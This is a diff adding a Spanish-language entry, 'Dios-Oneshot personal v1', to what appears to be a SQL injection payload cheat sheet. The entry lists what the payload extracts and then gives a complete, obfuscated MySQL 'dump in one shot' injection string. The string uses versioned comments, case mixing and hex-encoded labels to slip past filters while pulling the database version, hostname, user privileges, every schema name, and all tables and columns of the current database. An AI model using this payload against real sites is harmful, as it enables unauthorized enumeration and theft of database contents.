@@ -1194,6 +1194,17 @@ uNion%20sElECt%20%2F*%21%20dAtaBaSE()%20*%2F%2b--%2b
 
 ## Personal v1
 
+Dios-Oneshot personal
+
+V1 cuenta con:
+
+- Verision de base de datos
+- Hostname
+- Privilegios
+- Cuenta y enumeracion de todas las bases de datos
+- Cuenta y enumeracion de todas las tablas de la base de datos
+  actual con sus respectivas columnas
+
 ```
 /*!50000cOnCat*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(/*!50000SElECT*/+/*!50000GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)*/+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c62723e,0x3c613e546f74616c204261736573206465206461746f733a203c2f613e,0x3c62723e,(SELECT+count(/*!50000cOnCat*/(schema_name))+FROM+INFORMATION_SCHEMA.schemata),0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c613e42617365206465206461746f73207574696c697a6164613a203c2f613e,0x3c62723e,database(),0x3c62723e,0x3c62723e,0x3c613e4e756d65726f206465207461626c61733a203c2f613e,0x3c62723e,(SELECT+count(CONCAT(table_name))+FROM+INFORMATION_SCHEMA.tables+where+table_schema=database()),0x3c62723e,0x3c62723e,0x3c613e5461626c617320792073757320636f6c756d6e61733a203c2f613e,0x3c62723e,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
 
